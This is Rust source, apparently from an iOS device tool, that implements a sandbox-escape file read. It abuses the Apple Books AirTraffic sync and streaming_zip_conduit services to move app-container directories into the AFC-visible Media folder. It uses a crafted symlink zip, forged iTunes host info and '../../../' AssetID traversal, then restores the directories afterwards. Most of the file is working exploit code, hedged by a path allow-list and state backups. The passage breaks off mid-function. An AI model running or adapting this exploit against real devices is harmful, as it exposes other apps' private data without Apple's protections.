//! Airlift *pull-then-restore* directory listing — AirManager's trick, no HouseArrest.
//!
//! AirCard/AirManager never use `com.apple.mobile.house_arrest` to *read* a
//! container: they abuse the Apple Books sync engine (`com.apple.atc` +
//! `com.apple.streaming_zip_conduit`) as a "move any object anywhere" primitive
//! and read the result back over ordinary AFC, whose root is
//! `/var/mobile/Media`.
//!
//! # The three base systems
//!
//! * **Real / jail path** — e.g. `/var/mobile/Containers/Data/Application/<uuid>/Data`.
//!   This is what the caller hands in (`al_airlift_list_dir`).
//! * **Books/Sync-relative (`AssetID`)** — relative to `/var/mobile/Media/Books/Sync`,
//!   because that is the directory holding `Books.plist`. `"../../X"` is
//!   `<Media>/X`, `"../../../a"` is `/var/mobile/a`.
//! * **Media-root-relative (`AssetPath`)** — relative to `/var/mobile/Media`, so
//!   `"Airlock/Read/<T>"` is `/var/mobile/Media/Airlock/Read/<T>`.
//!
//! `FileComplete { AssetID, AssetPath }` makes the Books daemon **move** the
//! object `AssetID` to `AssetPath` (Media-relative), resolving symlinks on the
//! way. Directories move as a unit. That is the whole primitive.
//!
//! # STEP A/B/C/D, per call
//!
//! ```text
//! STEP A  stage_restore_symlink   zip one symlink airlift-pull-<T>/p0/p1/p2/link
//!                                -> ../../../<parent of target, no leading />
//! STEP B  atc_asset_sync (1 asset) ../../../<target rel. to /var/mobile>
//!                                 -> Airlock/Read/<T>          (PULL)
//! STEP D  write_recovery_record   Airlock/Read/<T>.json        (before STEP C)
//! STEP C  atc_asset_sync (2 assets, one session, in order)
//!           ../../airlift-pull-<T>/p0/p1/p2/link -> airlift-link-<T>
//!           ../../Airlock/Read/<T>              -> airlift-link-<T>/<basename>
//! STEP D  cleanup + Books.plist restore
//! ```
//!
//! After STEP C the moved symlink sits at `/var/mobile/Media/airlift-link-<T>`
//! (the *object* is renamed to the `AssetPath` — the `p0/p1/p2` nesting is not
//! reproduced), so `"../../../var/mobile/<x>"` resolves `/var/mobile/Media`
//! → `/` → `/var/mobile/<x>`, i.e. the real target parent. STEP C's second
//! `FileComplete` then drops the pulled directory back through that symlink.
//!
//! # Why the symlink carries `../../../var/mobile/…` and not `../../../<a>`
//!
//! The link is *relocated* by STEP C before it is ever followed, and it always
//! ends up directly under the Media root — exactly three levels below `/`, so
//! `"../../.."` is `/` and the tail has to repeat `var/mobile`. The same
//! arithmetic fixes the STEP B `AssetID`: it is spelled relative to
//! `/var/mobile/Media/Books/Sync`, so `../../..` is `/var/mobile` and the tail
//! is the path *relative to `/var/mobile`* (`../../../Containers/…`), never the
//! full `/var/mobile/…` spelling.
//!
//! # Safety model
//!
//! * **Never automatic.** Nothing here runs at app launch or from a scroll
//!   view; the only entry points are the two `al_airlift_*` FFI functions that
//!   the Swift caller has to invoke for the current directory explicitly.
//! * `checked_pull_path` refuses anything outside the app-container roots
//!   (`…/Containers/Data/Application`, `…/Containers/Shared/AppGroup`,
//!   `/var/mobile/Applications`) and any `..` component. `/var/mobile/Media`
//!   is *not* reachable, so the Airlift staging zone cannot be targeted.
//! * `Books/Sync/Books.plist` and `OutstandingAssets_4.sqlite` are snapshotted
//!   before the first sync (in memory *and* in a temp file inside the app
//!   container) and restored after every step.
//! * One process-wide mutex (the same `lock_tunnel` the AFC browser uses)
//!   serialises every ATC sync.
//! * Nothing is deleted unless the *next* link in the chain is confirmed by
//!   AFC, so an interrupted pull always leaves the data reachable at
//!   `Airlock/Read/<T>` with a `<T>.json` recovery record next to it.

use std::ffi::{c_char, c_void};
use std::time::Duration;

use idevice::afc::opcode::AfcFopenMode;
use idevice::afc::AfcClient;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::browse::{
    base64_decode, base64_encode, finish_string_result, list_dir_json, lock_tunnel,
};
use crate::exploit::{
    atc_message_name, build_books_plist, connect_tunnel, make_atc_msg, random_hex, read_atc_dict,
    send_atc_dict, AppDeviceTunnel, Logger, ALLogCallback, LINK_PREFIX,
};
use crate::ffi_util::{opt_str, run_with_large_stack};

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Media-root-relative directory the pulled directories are parked in.
const AIRLOCK_READ: &str = "Airlock/Read";
/// Media-root-relative staging directory for the restore symlink zip.
const PULL_PREFIX: &str = "airlift-pull-";
/// AFC-relative path of the Books sync manifest we rewrite for every step.
const BOOKS_PLIST: &str = "Books/Sync/Books.plist";
/// Zip entry holding the restore symlink inside the staged MediaSubdir.
const LINK_ENTRY: &str = "p0/p1/p2/link";

/// Sync metadata that is snapshotted before, and restored after, every step.
///
/// `OutstandingAssets_4.sqlite` keeps the daemon's outstanding-asset journal; a
/// manifest that does not match it is what leaves Books stuck on an update
/// screen, so both plausible spellings (with/without the `Database`
/// component) and the `-wal`/`-shm` siblings are covered.
const SYNC_STATE_FILES: &[&str] = &[
    BOOKS_PLIST,
    "Books/Sync/Database/OutstandingAssets_4.sqlite",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-wal",
    "Books/Sync/Database/OutstandingAssets_4.sqlite-shm",
    "Books/Sync/OutstandingAssets_4.sqlite",
    "Books/Sync/OutstandingAssets_4.sqlite-wal",
    "Books/Sync/OutstandingAssets_4.sqlite-shm",
];

/// Largest sync-metadata file that is snapshotted (16 MiB).
const MAX_BACKUP_BYTES: usize = 16 * 1024 * 1024;
/// Pause between two `FileComplete` messages inside one session. Order matters
/// (symlink first, directory second), so the daemon must have finished the
/// first move before the second is announced.
const FILE_COMPLETE_PAUSE: Duration = Duration::from_millis(900);

/// Device roots a pull is allowed to touch.
const PULL_ROOTS: &[&str] = &[
    "/var/mobile/Containers/Data/Application",
    "/var/mobile/Containers/Shared/AppGroup",
    "/var/mobile/Applications",
];

// ---------------------------------------------------------------------------
// Path helpers (pure, unit-tested)
// ---------------------------------------------------------------------------

/// Validate a caller-supplied device path for a pull.
///
/// Normalises `/private/var/…` to `/var/…`, collapses repeated slashes and
/// strips the trailing one, then requires the result to live under one of
/// [`PULL_ROOTS`]. `..` is refused outright — the only `..` this file ever
/// emits is the fixed three-segment prefix inside an `AssetID`/`LinkTarget`,
/// which is derived from the base systems above and never from caller input.
pub(crate) fn checked_pull_path(path: &str) -> Result<String, String> {
    let trimmed = path.trim();
    if trimmed.is_empty() {
        return Err("path must not be empty".to_owned());
    }
    if !trimmed.starts_with('/') {
        return Err(format!(
            "path must be an absolute device path such as /var/mobile/Containers/Data/Application/<uuid>/Documents, got '{trimmed}'"
        ));
    }

    let mut components: Vec<&str> = Vec::new();
    for component in trimmed.split('/') {
        if component.is_empty() {
            continue;
        }
        if component == ".." {
            return Err(format!("path must not contain '..', got '{trimmed}'"));
        }
        if component == "Airlock" || component == "Books.plist" {
            return Err(format!("'{component}' is reserved by Airlift and cannot be pulled"));
        }
        components.push(component);
    }
    // `/private/var/…` and `/var/…` are the same directory on device: only the
    // `private` prefix goes away, the `var` component is part of the path.
    if components.first() == Some(&"private") && components.get(1) == Some(&"var") {
        components.remove(0);
    }
    if components.len() < 3 || components[0] != "var" || components[1] != "mobile" {
        return Err(format!(
            "path must live under /var/mobile, got '{trimmed}'"
        ));
    }

    let normalized = format!("/{}", components.join("/"));
    if !PULL_ROOTS
        .iter()
        .any(|root| normalized == *root || normalized.starts_with(&format!("{root}/")))
    {
        return Err(format!(
            "path must live under {} (app containers), got '{normalized}'",
            PULL_ROOTS.join(", ")
        ));
    }
    Ok(normalized)
}

/// Split a normalised absolute path into `(parent, basename)`.
///
/// The parent is where the restore symlink points, so it has to be a real
/// directory under `/var/mobile` — `/var/mobile` itself and anything shallower
/// is refused (there would be no parent to drop the directory back into).
fn parent_and_basename(abs: &str) -> Result<(String, String), String> {
    let trimmed = abs.trim_end_matches('/');
    match trimmed.rsplit_once('/') {
        Some((parent, name))
            if !name.is_empty() && parent.starts_with("/var/mobile/") =>
        {
            Ok((parent.to_owned(), name.to_owned()))
        }
        _ => Err(format!(
            "'{abs}' has no usable parent directory; pull a directory inside an app container"
        )),
    }
}

/// `LinkTarget` for the staged symlink: three levels up from the Media root
/// is `/`, so the tail repeats `var/mobile`.
fn link_target_for_parent(parent_abs: &str) -> String {
    format!("../../../{}", parent_abs.trim_start_matches('/'))
}

/// `AssetID` naming a real device path, relative to `Books/Sync`
/// (`/var/mobile/Media/Books/Sync`). `../../..` is `/var/mobile`, so the tail
/// is the path *relative to `/var/mobile`* — not the full `/var/mobile/…`
/// spelling, which would resolve one level too deep.
fn asset_id_for_device_path(abs: &str) -> Result<String, String> {
    let rest = abs
        .trim_end_matches('/')
        .strip_prefix("/var/mobile/")
        .ok_or_else(|| format!("'{abs}' is not under /var/mobile"))?;
    if rest.is_empty() {
        return Err(format!("'{abs}' has nothing to pull"));
    }
    Ok(format!("../../../{rest}"))
}

/// `AssetID` naming an object inside `/var/mobile/Media` (`../../` is the
/// Media root, which is where AFC and the zip staging live).
fn media_asset_id(relative_to_media: &str) -> String {
    format!("../../{relative_to_media}")
}

// ---------------------------------------------------------------------------
// Books sync-state snapshot
// ---------------------------------------------------------------------------

/// What was found at one sync-metadata path when the snapshot was taken.
#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(tag = "state", rename_all = "snake_case")]
enum BackupState {
    /// Existed and is small enough to restore byte-for-byte.
    Present { data_b64: String },
    /// Did not exist — restore removes whatever is there now.
    Absent,
    /// Existed but was too large to hold in memory. Never written to, so the
    /// restore must leave it exactly as it is.
    Untouched,
}

#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct BooksSyncBackup {
    token: String,
    entries: Vec<(String, BackupState)>,
}

impl BooksSyncBackup {
    /// Read every sync-metadata file over AFC. Missing files are recorded as
    /// [`BackupState::Absent`] so the restore can undo a create.
    async fn capture(afc: &mut AfcClient, token: &str, logger: &Logger) -> Self {
        let mut entries = Vec::with_capacity(SYNC_STATE_FILES.len());
        for path in SYNC_STATE_FILES {
            let state = match afc.get_file_info((*path).to_owned()).await {
                Ok(info) if info.size > MAX_BACKUP_BYTES => {
                    logger.log(format!(
                        "airlift: {path} is {} bytes (over {MAX_BACKUP_BYTES}); snapshotting it as Untouched",
                        info.size
                    ));
                    BackupState::Untouched
                }
                Ok(_) => match afc.open((*path).to_owned(), AfcFopenMode::RdOnly).await {
                    Ok(mut fd) => {
                        let read = fd.read_entire().await;
                        let _ = fd.close().await;
                        match read {
                            Ok(data) if data.len() <= MAX_BACKUP_BYTES => {
                                BackupState::Present { data_b64: base64_encode(&data) }
                            }
                            Ok(data) => {
                                logger.log(format!(
                                    "airlift: {path} read {} bytes (over {MAX_BACKUP_BYTES}); snapshotting it as Untouched",
                                    data.len()
                                ));
                                BackupState::Untouched
                            }
                            Err(e) => {
                                logger.log(format!(
                                    "airlift: snapshot read of {path} failed: {e:?}; leaving it untouched"
                                ));
                                BackupState::Untouched
                            }
                        }
                    }
                    Err(e) => {
                        logger.log(format!(
                            "airlift: snapshot open of {path} failed: {e:?}; leaving it untouched"
                        ));
                        BackupState::Untouched
                    }
                },
                Err(_) => BackupState::Absent,
            };
            entries.push(((*path).to_owned(), state));
        }
        logger.log(format!("airlift: snapshotted {} Books sync-state file(s)", entries.len()));
        Self { token: token.to_owned(), entries }
    }

    /// Put the snapshotted bytes back. Best-effort: a failure here is logged
    /// and reported, never silently swallowed.
    async fn restore(&self, afc: &mut AfcClient, logger: &Logger) -> Result<(), String> {
        let _ = afc.mk_dir("Books").await;
        let _ = afc.mk_dir("Books/Sync").await;
        let _ = afc.mk_dir("Books/Sync/Database").await;
        let mut failures: Vec<String> = Vec::new();
        for (path, state) in &self.entries {
            match state {
                BackupState::Present { data_b64 } => {
                    let bytes = base64_decode(data_b64)
                        .map_err(|e| format!("decode snapshot of {path}: {e}"))?;
                    match afc.open(path.clone(), AfcFopenMode::WrOnly).await {
                        Ok(mut fd) => {
                            let write = fd.write_entire(&bytes).await;
                            let close = fd.close().await;
                            if write.is_err() || close.is_err() {
                                failures.push(format!(
                                    "{path}: write={:?} close={:?}",
                                    write.err(),
                                    close.err()
                                ));
                            }
                        }
                        Err(e) => failures.push(format!("{path}: open failed: {e:?}")),
                    }
                }
                BackupState::Absent => {
                    // Best-effort delete; `NotFound` is the expected outcome.
                    if afc.remove(path.clone()).await.is_ok() {
                        logger.log(format!("airlift: removed transient {path}"));
                    }
                }
                BackupState::Untouched => {}
            }
        }
        if failures.is_empty() {
            logger.log("airlift: restored Books sync state");
            Ok(())
        } else {
            Err(format!("Books sync-state restore incomplete: {}", failures.join("; ")))
        }
    }

    /// Persist the snapshot next to the app in its container temp directory so
    /// a crash mid-sequence still leaves the original manifest on disk.
    fn save_to_temp(&self) -> std::io::Result<std::path::PathBuf> {
        let path = std::env::temp_dir().join(format!("airlift-books-sync-{}.json", self.token));
        let bytes = serde_json::to_vec_pretty(self)
            .map_err(|e| std::io::Error::other(format!("encode snapshot: {e}")))?;
        std::fs::write(&path, bytes)?;
        Ok(path)
    }
}

// ---------------------------------------------------------------------------
// Recovery record
// ---------------------------------------------------------------------------

/// Written to `Airlock/Read/<T>.json` after the pull succeeds and before the
/// restore, so an interrupted run can be finished by `al_airlift_recover`.
#[derive(Clone, serde::Serialize, serde::Deserialize)]
struct RecoveryRecord {
    target: String,
    token: String,
    basename: String,
    parent: String,
}

impl RecoveryRecord {
    /// A record read back off the device is untrusted input: `parent` decides
    /// what the restore symlink points at and `basename` names the destination
    /// leaf, so both have to be re-validated before anything is staged or
    /// moved. Without this a corrupt record would turn `al_airlift_recover`
    /// into an arbitrary-write primitive.
    fn validate(&self) -> Result<(), String> {
        let parent = checked_pull_path(&self.parent)
            .map_err(|e| format!("recovery record parent rejected: {e}"))?;
        if parent != self.parent.trim_end_matches('/') {
            return Err(format!(
                "recovery record parent '{}' is not in canonical form (expected '{parent}')",
                self.parent
            ));
        }
        let target = checked_pull_path(&self.target)
            .map_err(|e| format!("recovery record target rejected: {e}"))?;
        if !target.starts_with(&format!("{parent}/")) {
            return Err(format!(
                "recovery record target '{target}' is not inside its parent '{parent}'"
            ));
        }
        if self.basename.is_empty()
            || self.basename.contains('/')
            || self.basename == "."
            || self.basename == ".."
        {
            return Err(format!(
                "recovery record basename '{}' is not a single safe name",
                self.basename
            ));
        }
        if self.basename != target.rsplit('/').next().unwrap_or_default() {
            return Err(format!(
                "recovery record basename '{}' does not match target '{target}'",
                self.basename
            ));
        }
        if self.token.is_empty()
            || !self
                .token
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '-')
        {
            return Err(format!(
                "recovery record token '{}' is not a plain token",
                self.token
            ));
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Zip / AFC primitives
// ---------------------------------------------------------------------------

/// StreamingZip archive holding exactly one symlink, `p0/p1/p2/link`.
///
/// Same shape as the proven write path's archive (META-INF ZipMetadata
/// plist, `p0/p1/p2` directories, the `0x5A53` extra field carrying the unix
/// mode) minus the payload file: the only thing this archive has to produce is
/// a dangling symlink whose `LinkTarget` reaches out of the sandbox.
fn build_symlink_archive(
    link_target: &str,
) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
    use std::io::Write as _;

    use zip::write::{ExtendedFileOptions, FileOptions};
    use zip::{CompressionMethod, ZipWriter};

    let mut buf = Vec::new();
    let mut zip = ZipWriter::new(std::io::Cursor::new(&mut buf));

    fn zip_opts(mode: u32) -> FileOptions<'static, ExtendedFileOptions> {
        let mut opts = FileOptions::default()
            .compression_method(CompressionMethod::Stored)
            .unix_permissions(mode);
        let mode_bytes = (mode as u16).to_le_bytes();
        let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
        opts
    }

    zip.add_directory("META-INF/", zip_opts(0o040755))?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))?;
    let meta_plist: plist::Value = {
        let mut d = plist::Dictionary::new();
        d.insert("Version".to_owned(), plist::Value::Integer(2.into()));
        plist::Value::Dictionary(d)
    };
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &meta_plist)?;
    zip.write_all(&meta_buf)?;

    for dir in ["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(dir, zip_opts(0o040755))?;
    }
    zip.add_symlink(LINK_ENTRY, link_target, zip_opts(0o120777))?;
    zip.finish()?;
    Ok(buf)
}

/// STEP A — stage the restore symlink under `media_subdir` with the
/// `streaming_zip_conduit` handshake, read the `DataComplete` reply and verify
/// the link really landed (a symlink whose target dangles still shows up in
/// AFC, so the check is about the staging, not about reachability).
async fn stage_restore_symlink(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    media_subdir: &str,
    link_target: &str,
    logger: &Logger,
) -> Result<(), String> {
    let archive =
        build_symlink_archive(link_target).map_err(|e| format!("build_symlink_archive: {e}"))?;
    logger.log(format!(
        "airlift: STEP A staging restore symlink at {media_subdir}/{LINK_ENTRY} -> {link_target} ({} bytes)",
        archive.len()
    ));

    let mut zip_stream = tunnel
        .connect_service("com.apple.streaming_zip_conduit", logger)
        .await?;

    let mut zip_init_dict = plist::Dictionary::new();
    zip_init_dict.insert(
        "MediaSubdir".to_string(),
        plist::Value::String(media_subdir.to_owned()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(zip_init_dict))
        .map_err(|e| format!("encode MediaSubdir: {e}"))?;
    zip_stream
        .write_all(&(init_buf.len() as u32).to_be_bytes())
        .await
        .map_err(|e| format!("write MediaSubdir length: {e}"))?;
    zip_stream
        .write_all(&init_buf)
        .await
        .map_err(|e| format!("write MediaSubdir body: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    zip_stream
        .write_all(&archive)
        .await
        .map_err(|e| format!("write archive bytes: {e}"))?;
    zip_stream.flush().await.map_err(|e| format!("flush: {e}"))?;

    let mut resp_len_buf = [0u8; 4];
    zip_stream
        .read_exact(&mut resp_len_buf)
        .await
        .map_err(|e| format!("read zip response length: {e}"))?;
    let resp_len = u32::from_be_bytes(resp_len_buf) as usize;
    let mut resp_body = vec![0u8; resp_len];
    zip_stream
        .read_exact(&mut resp_body)
        .await
        .map_err(|e| format!("read zip response body: {e}"))?;
    drop(zip_stream);

    match plist::from_bytes::<plist::Value>(&resp_body) {
        Ok(plist::Value::Dictionary(dict)) => {
            let name = atc_message_name(&dict).unwrap_or_else(|| "<unnamed>".to_owned());
            logger.log(format!("airlift: STEP A streaming_zip_conduit replied '{name}'"));
        }
        _ => logger.log(format!(
            "airlift: STEP A streaming_zip_conduit replied with {} unparsed byte(s)",
            resp_body.len()
        )),
    }

    let staged = format!("{media_subdir}/{LINK_ENTRY}");
    afc.get_file_info(staged.clone()).await.map_err(|e| {
        format!("STEP A verification failed: {staged} missing from Media ({e:?})")
    })?;
    logger.log(format!("airlift: STEP A verified {staged} in Media"));
    Ok(())
}

/// Write `Books.plist` with one manifest row per identifier. Identifiers are
/// the `Persistent ID` values; `Item ID`/`DSID` follow the write path's shape.
async fn write_books_plist(
    afc: &mut AfcClient,
    identifiers: &[String],
    logger: &Logger,
) -> Result<(), String> {
    for dir in ["Airlock", "Airlock/Book", AIRLOCK_READ, "Books", "Books/Sync"] {
        let _ = afc.mk_dir(dir).await;
    }
    let plist_bytes =
        build_books_plist(identifiers).map_err(|e| format!("build_books_plist: {e}"))?;
    let mut fd = afc
        .open(BOOKS_PLIST, AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open Books.plist: {e:?}"))?;
    fd.write_entire(&plist_bytes)
        .await
        .map_err(|e| format!("AFC write Books.plist: {e:?}"))?;
    let _ = fd.close().await;
    logger.log(format!(
        "airlift: Books.plist manifest now declares {identifiers:?}"
    ));
    Ok(())
}

/// The AirTraffic handshake plus one `FileComplete` per asset, all in one
/// session — byte-for-byte the sequence the proven write path drives:
///
/// `Capabilities`/`SyncAllowed` → `HostInfo` → `RequestingSync` →
/// `ReadyForSync` → `FinishedSyncingMetadata` → `AssetManifest` →
/// `FileComplete`×N.
///
/// `identifiers` and `destinations` are parallel and must have the same
/// length; the order is significant (the symlink has to be in place before the
/// directory is dropped through it), hence the fixed pause between messages.
async fn atc_asset_sync(
    tunnel: &mut AppDeviceTunnel,
    identifiers: &[String],
    destinations: &[String],
    label: &str,
    logger: &Logger,
) -> Result<(), String> {
    if identifiers.len() != destinations.len() {
        return Err(format!(
            "internal: {label} has {} identifiers but {} destinations",
            identifiers.len(),
            destinations.len()
        ));
    }

    let mut atc_stream = tunnel.connect_service("com.apple.atc", logger).await?;

    // Wait for SyncAllowed (capturing GrappaSupportInfo on the way).
    let mut grappa_info: Option<(u32, u32, u32)> = None;
    for _ in 0..12 {
        match tokio::time::timeout(
            Duration::from_millis(1500),
            read_atc_dict(&mut atc_stream),
        )
        .await
        {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc received '{name}'"));
                    if name == "Capabilities" {
                        if let Some(params) = dict.get("Params").and_then(|p| p.as_dictionary()) {
                            if let Some(gi) = params
                                .get("GrappaSupportInfo")
                                .and_then(|g| g.as_dictionary())
                            {
                                let ver = gi
                                    .get("version")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                let dt = gi
                                    .get("deviceType")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(0) as u32;
                                let pv = gi
                                    .get("protocolVersion")
                                    .and_then(|v| v.as_unsigned_integer())
                                    .unwrap_or(1) as u32;
                                logger.log(format!(
                                    "airlift: {label}: GrappaSupportInfo version={ver}, deviceType={dt}, protocolVersion={pv}"
                                ));
                                grappa_info = Some((ver, dt, pv));
                            }
                        }
                    }
                    if name == "SyncAllowed" {
                        break;
                    }
                }
            }
            Ok(Err(_)) => break,
            Err(_) => {}
        }
    }

    // HostInfo (Session = 0)
    let mut host_info_dict = plist::Dictionary::new();
    host_info_dict.insert("Type".into(), plist::Value::String("iTunes".into()));
    host_info_dict.insert("Version".into(), plist::Value::String("13.7.0.161".into()));
    host_info_dict.insert("MacOSVersion".into(), plist::Value::String("15.0".into()));
    host_info_dict.insert("SyncHostName".into(), plist::Value::String("airlift".into()));
    let library_id = format!(
        "{}-{}-{}-{}-{}",
        random_hex(4),
        random_hex(2),
        random_hex(2),
        random_hex(2),
        random_hex(6)
    );
    host_info_dict.insert("LibraryID".into(), plist::Value::String(library_id));
    host_info_dict.insert(
        "SyncedDataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert(
        "SyncedAssetTypes".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    host_info_dict.insert("Wakeable".into(), plist::Value::Boolean(false));

    let grappa_token = crate::grappa::generate_grappa_token(grappa_info, |s| logger.log(s));
    if let Some(ref token) = grappa_token {
        host_info_dict.insert("Grappa".into(), plist::Value::Data(token.clone()));
    }

    let mut host_info_params = plist::Dictionary::new();
    host_info_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict.clone()));
    host_info_params.insert("LocalCloudSupport".into(), plist::Value::Boolean(false));
    send_atc_dict(&mut atc_stream, &make_atc_msg("HostInfo", 0, Some(host_info_params))).await?;

    tokio::time::sleep(Duration::from_millis(200)).await;

    // RequestingSync (Session = 1)
    let mut sync_req_params = plist::Dictionary::new();
    sync_req_params.insert(
        "Dataclasses".into(),
        plist::Value::Array(vec![plist::Value::String("Book".into())]),
    );
    sync_req_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    sync_req_params.insert("HostInfo".into(), plist::Value::Dictionary(host_info_dict));
    if let Some(token) = grappa_token {
        sync_req_params.insert("Grappa".into(), plist::Value::Data(token));
    }
    send_atc_dict(
        &mut atc_stream,
        &make_atc_msg("RequestingSync", 1, Some(sync_req_params)),
    )
    .await?;

    // ReadyForSync
    let mut ready = false;
    for _ in 0..24 {
        match tokio::time::timeout(Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc sync state '{name}'"));
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "ReadyForSync" || name == "AssetManifest" {
                        ready = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        logger.log(format!("airlift: {label}: atc sync notice (non-fatal): {dict:?}"));
                        continue;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("{label}: ATC read error: {e}")),
            Err(_) => {}
        }
    }
    if !ready {
        return Err(format!(
            "{label}: AirTraffic ReadyForSync not observed (ensure Apple Books is installed)"
        ));
    }

    // FinishedSyncingMetadata (Session = 1)
    let mut sync_types = plist::Dictionary::new();
    sync_types.insert("Book".into(), plist::Value::Integer(1.into()));
    let mut meta_params = plist::Dictionary::new();
    meta_params.insert("SyncTypes".into(), plist::Value::Dictionary(sync_types));
    meta_params.insert(
        "DataclassAnchors".into(),
        plist::Value::Dictionary(plist::Dictionary::new()),
    );
    send_atc_dict(
        &mut atc_stream,
        &make_atc_msg("FinishedSyncingMetadata", 1, Some(meta_params)),
    )
    .await?;

    // AssetManifest
    let mut manifest_observed = false;
    for _ in 0..20 {
        match tokio::time::timeout(Duration::from_secs(5), read_atc_dict(&mut atc_stream)).await {
            Ok(Ok(dict)) => {
                if let Some(name) = atc_message_name(&dict) {
                    logger.log(format!("airlift: {label}: atc manifest message '{name}'"));
                    if name == "Ping" {
                        let _ = send_atc_dict(&mut atc_stream, &make_atc_msg("Pong", 1, None)).await;
                        continue;
                    }
                    if name == "AssetManifest" {
                        manifest_observed = true;
                        break;
                    }
                    if name == "SyncFailed" {
                        logger.log(format!("airlift: {label}: atc manifest notice (non-fatal): {dict:?}"));
                        continue;
                    }
                    if name == "SyncFinished" {
                        break;
                    }
                }
            }
            Ok(Err(e)) => return Err(format!("{label}: ATC manifest read error: {e}")),
            Err(_) => {}
        }
    }
    if !manifest_observed {
        return Err(format!(
            "{label}: AirTraffic AssetManifest not observed (ensure Apple Books is installed)"
        ));
    }

    // FileComplete per asset, in order.
    for (index, (asset_id, asset_path)) in identifiers.iter().zip(destinations.iter()).enumerate() {
        logger.log(format!(
            "airlift: {label}: FileComplete [{}/{}] {asset_id} -> {asset_path}",
            index + 1,
            identifiers.len()
        ));
        let mut file_complete_params = plist::Dictionary::new();
        file_complete_params.insert("AssetID".into(), plist::Value::String(asset_id.clone()));
        file_complete_params.insert("Dataclass".into(), plist::Value::String("Book".into()));
        file_complete_params.insert("AssetPath".into(), plist::Value::String(asset_path.clone()));
        send_atc_dict(
            &mut atc_stream,
            &make_atc_msg("FileComplete", 1, Some(file_complete_params)),
        )
        .await?;
        if index + 1 < identifiers.len() {
            tokio::time::sleep(FILE_COMPLETE_PAUSE).await;
        }
    }

    tokio::time::sleep(Duration::from_secs(2)).await;
    drop(atc_stream);
    tokio::time::sleep(Duration::from_millis(300)).await;
    logger.log(format!("airlift: {label}: ATC session finished"));
    Ok(())
}

/// Remove a path, tolerating "not there" — cleanup is always best-effort.
async fn remove_quietly(afc: &mut AfcClient, path: &str, logger: &Logger) {
    if afc.remove(path.to_owned()).await.is_ok() {
        logger.log(format!("airlift: removed {path}"));
        return;
    }
    if afc.remove_all(path.to_owned()).await.is_ok() {
        logger.log(format!("airlift: removed {path} recursively"));
        return;
    }
    logger.log(format!("airlift: nothing to remove at {path}"));
}

async fn open_session(
    pairing_path: &str,
    logger: &Logger,
) -> Result<(AppDeviceTunnel, AfcClient), String> {
    let pairing_bytes = std::fs::read(pairing_path)
        .map_err(|e| format!("Failed to read pairing file at {pairing_path}: {e}"))?;
    let mut tunnel = connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;
    for dir in ["Airlock", AIRLOCK_READ, "Books", "Books/Sync"] {
        let _ = afc.mk_dir(dir).await;
    }
    Ok((tunnel, afc))
}

/// STEP D — persist the recovery record next to the pulled directory.
async fn write_recovery_record(
    afc: &mut AfcClient,
    record: &RecoveryRecord,
    logger: &Logger,
) -> Result<(), String> {
    let path = format!("{AIRLOCK_READ}/{}.json", record.token);
    let bytes = serde_json::to_vec(record).map_err(|e| format!("encode recovery record: {e}"))?;
    let mut fd = afc
        .open(path.clone(), AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC open {path}: {e:?}"))?;
    fd.write_entire(&bytes)
        .await
        .map_err(|e| format!("AFC write {path}: {e:?}"))?;
    let _ = fd.close().await;
    logger.log(format!("airlift: STEP D recovery record written to {path}"));
    Ok(())
}

/// Message used whenever the pulled data has to stay where it is. The wording
/// is contractual: the Swift layer greps for it to offer `al_airlift_recover`.
fn kept_at_error(token: &str, reason: &str) -> String {
    format!(
        "airlift pull '{token}': {reason}; directory kept at {AIRLOCK_READ}/{token}; retry or call al_airlift_recover"
    )
}

// ---------------------------------------------------------------------------
// STEP A/B/C/D driver
// ---------------------------------------------------------------------------

/// Pull `target_abs` into `Airlock/Read/<T>`, list it, push it back and clean
/// up. Returns the listing JSON in exactly the shape `al_dir_list` emits.
async fn pull_list_and_restore(
    pairing_path: &str,
    target_abs: &str,
    logger: &Logger,
) -> Result<String, String> {
    let (parent, basename) = parent_and_basename(target_abs)?;
    let token = random_hex(10);
    let pull_dir = format!("{PULL_PREFIX}{token}");
    let link_dest = format!("{LINK_PREFIX}{token}");
    let read_dir = format!("{AIRLOCK_READ}/{token}");
    let record_path = format!("{read_dir}.json");

    let asset_id_pull = asset_id_for_device_path(target_abs)?;
    let asset_id_link = media_asset_id(&format!("{pull_dir}/{LINK_ENTRY}"));
    let asset_id_read = media_asset_id(&read_dir);

    logger.log(format!(
